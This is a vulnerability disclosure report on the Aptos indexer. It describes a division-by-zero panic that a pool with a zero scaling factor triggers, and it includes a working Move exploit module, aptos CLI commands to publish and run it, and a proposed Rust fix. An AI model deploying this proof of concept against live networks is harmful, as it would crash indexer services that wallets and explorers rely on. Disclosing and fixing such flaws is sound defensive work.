# Audit Report

## Title
Indexer Crash via Division by Zero in Pool Scaling Factor Processing

## Summary
An attacker can crash the Aptos indexer by publishing a Move module that creates a `pool_u64_unbound::Pool` resource with `scaling_factor = 0` and storing it in a table. When the indexer processes this transaction, it performs an unguarded division by the scaling factor, causing a panic and crashing the indexer service.

## Finding Description

The vulnerability exists in the indexer's processing of `pool_u64_unbound::Pool` resources from blockchain write table items. [1](#0-0) 

The function `get_inactive_pool_metadata_from_write_table_item()` processes all WriteTableItems with type `0x1::pool_u64_unbound::Pool`. At line 160, it performs division without validating that `scaling_factor` is non-zero.

The root cause is that the Move framework's `pool_u64_unbound` module allows creating pools with any scaling factor, including zero: [2](#0-1) 

While legitimate delegation pools always use the constant `SHARES_SCALING_FACTOR` (10^16): [3](#0-2) 

An attacker can publish a custom Move module that calls `create_with_scaling_factor(0)` since it is a public function, creating a malicious Pool.

**Attack Path:**
1. Attacker publishes a Move module containing code that calls `pool_u64_unbound::create_with_scaling_factor(0)`
2. The module stores this Pool in a table (Pool has `store` ability)
3. When executed, this creates a WriteTableItem with type `0x1::pool_u64_unbound::Pool` and `scaling_factor = 0`
4. The indexer processes all transactions and encounters this WriteTableItem
5. `get_inactive_pool_metadata_from_write_table_item()` is called
6. At line 160: `let total_shares = &inner.total_shares / &inner.scaling_factor` performs division by zero
7. BigDecimal division by zero causes a Rust panic
8. Indexer process crashes

Additional vulnerable locations with the same issue: [4](#0-3) [5](#0-4) [6](#0-5) 

## Impact Explanation

This vulnerability qualifies as **High Severity** per the Aptos bug bounty program criteria, which explicitly lists "API crashes" as a High Severity impact.

The indexer is a critical off-chain component that provides APIs for:
- Querying account balances and transaction history
- Tracking delegation pool states
- Supporting wallets, explorers, and dApps

While the vulnerability does not affect blockchain consensus or validator operations, it causes:
- **Complete indexer service disruption**: The indexer crashes and stops processing new transactions
- **Ecosystem impact**: All services relying on indexer APIs become unavailable
- **Persistent attack**: The malicious Pool remains on-chain, potentially causing repeated crashes on indexer restart
- **Low recovery cost**: Requires code fix and redeployment to resolve

The impact is limited to availability (not integrity or confidentiality), but severely disrupts the Aptos ecosystem's user-facing infrastructure.

## Likelihood Explanation

**Likelihood: High**

The attack is trivial to execute:
- **No special permissions required**: Any user can publish Move modules
- **Low cost**: Only standard transaction fees (~gas costs)
- **Simple exploit**: Single malicious module publication
- **Deterministic**: Attack succeeds 100% of the time
- **No rate limiting**: Attacker can repeat if fixed without validation

The only barrier is understanding the indexer's processing logic, which is open source.

## Recommendation

Add validation to reject Pool resources with `scaling_factor = 0` before performing division:

```rust
pub fn get_inactive_pool_metadata_from_write_table_item(
    write_table_item: &WriteTableItem,
    txn_version: i64,
) -> anyhow::Result<Option<PoolBalanceMetadata>> {
    let table_item_data = write_table_item.data.as_ref().unwrap();

    if let Some(StakeTableItem::Pool(inner)) = StakeTableItem::from_table_item_type(
        table_item_data.value_type.as_str(),
        &table_item_data.value,
        txn_version,
    )? {
        // Validate scaling_factor is non-zero before division
        if inner.scaling_factor.is_zero() {
            return Ok(None); // Skip malformed pools
        }
        
        let total_coins = inner.total_coins;
        let total_shares = &inner.total_shares / &inner.scaling_factor;
        // ... rest of function
    }
}
```

Apply the same validation to all division sites in `delegator_balances.rs` lines 90, 151 and `delegator_pools.rs` line 132.

**Alternative**: Add validation in the Move framework's `create_with_scaling_factor()` to enforce `scaling_factor > 0`, but this would be a breaking change for the blockchain.

## Proof of Concept

**Move Module (exploit.move):**
```move
module attacker::exploit {
    use aptos_std::pool_u64_unbound;
    use aptos_std::table;
    
    struct MaliciousResource has key {
        pools: table::Table<u64, pool_u64_unbound::Pool>,
    }
    
    public entry fun create_malicious_pool(account: &signer) {
        // Create pool with scaling_factor = 0
        let malicious_pool = pool_u64_unbound::create_with_scaling_factor(0);
        
        // Store it in a table (this creates a WriteTableItem)
        let pools = table::new<u64, pool_u64_unbound::Pool>();
        table::add(&mut pools, 1, malicious_pool);
        
        move_to(account, MaliciousResource { pools });
    }
}
```

**Exploitation Steps:**
1. Compile and publish the module: `aptos move publish`
2. Execute the entry function: `aptos move run --function-id attacker::exploit::create_malicious_pool`
3. Transaction succeeds and writes the malicious Pool to the blockchain
4. Indexer processes the transaction
5. Indexer panics with "Division by zero" and crashes

The indexer will remain crashed until the code is patched with validation.

### Citations

**File:** crates/indexer/src/models/stake_models/delegator_pools.rs (L132-132)
```rust
                &inner.active_shares.total_shares / &inner.active_shares.scaling_factor;
```

**File:** crates/indexer/src/models/stake_models/delegator_pools.rs (L148-172)
```rust
    pub fn get_inactive_pool_metadata_from_write_table_item(
        write_table_item: &WriteTableItem,
        txn_version: i64,
    ) -> anyhow::Result<Option<PoolBalanceMetadata>> {
        let table_item_data = write_table_item.data.as_ref().unwrap();

        if let Some(StakeTableItem::Pool(inner)) = StakeTableItem::from_table_item_type(
            table_item_data.value_type.as_str(),
            &table_item_data.value,
            txn_version,
        )? {
            let total_coins = inner.total_coins;
            let total_shares = &inner.total_shares / &inner.scaling_factor;
            Ok(Some(PoolBalanceMetadata {
                transaction_version: txn_version,
                total_coins,
                total_shares,
                scaling_factor: inner.scaling_factor,
                shares_table_handle: inner.shares.inner.get_handle(),
                parent_table_handle: standardize_address(&write_table_item.handle.to_string()),
            }))
        } else {
            Ok(None)
        }
    }
```

**File:** aptos-move/framework/aptos-stdlib/sources/pool_u64_unbound.move (L62-70)
```text
    /// Create a new pool with custom `scaling_factor`.
    public fun create_with_scaling_factor(scaling_factor: u64): Pool {
        Pool {
            total_coins: 0,
            total_shares: 0,
            shares: table::new<address, u128>(),
            scaling_factor,
        }
    }
```

**File:** aptos-move/framework/aptos-framework/sources/delegation_pool.move (L246-248)
```text
    /// Scaling factor of shares pools used within the delegation pool
    const SHARES_SCALING_FACTOR: u64 = 10000000000000000;

```

**File:** crates/indexer/src/models/stake_models/delegator_balances.rs (L90-90)
```rust
            let shares = shares / &pool_balance.scaling_factor;
```

**File:** crates/indexer/src/models/stake_models/delegator_balances.rs (L151-151)
```rust
            let shares = shares / &pool_balance.scaling_factor;
```
